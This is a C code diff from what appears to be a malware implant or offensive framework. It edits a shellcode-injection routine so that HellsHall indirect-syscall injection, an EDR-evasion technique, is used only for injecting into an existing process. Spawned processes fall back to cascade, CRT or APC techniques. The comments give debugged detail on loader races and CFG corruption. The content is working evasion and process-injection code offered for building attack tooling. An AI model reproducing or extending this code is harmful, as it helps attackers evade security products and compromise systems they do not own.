@@ -15,9 +15,18 @@
 
 HANDLE inject_shellcode_into(PINSTANCE inst, HANDLE hProcess, HANDLE hInitialThread, BYTE* shellcode, DWORD sc_len, DWORD* step) {
 #ifdef INCLUDE_EVASION_HELLSHALL
-    // Prefer HellsHall indirect syscalls when available
-    if (inst->bHellsHallInit)
-        return inject_hellshall(inst, hProcess, shellcode, sc_len, step);
+    // HellsHall for inject-into-pid (no initial thread): preferred when
+    // available — indirect syscalls, CFG-safe thread creation via APC.
+    // NOT for spawn (hInitialThread != NULL): the child's main thread is
+    // still suspended at LdrInitializeThunk, and creating a second thread
+    // via NtCreateThreadEx triggers parallel loader init that races with
+    // the incomplete main-thread init, corrupting CFG bitmap state
+    // (dump-verified: 0xC0000409 in localspl.dll/gpsvc.dll DllMain).
+    // Spawn uses the compile-time technique (cascade/crt/apc) instead —
+    // cascade is designed for exactly this case (shim-callback APC on the
+    // main thread, so the loader completes normally).
+    if (!hInitialThread && inst->bHellsHallInit)
+        return inject_hellshall(inst, hProcess, shellcode, sc_len, step, FALSE);
 #endif
 
 #if INJECTION_TECHNIQUE == INJECT_CRT
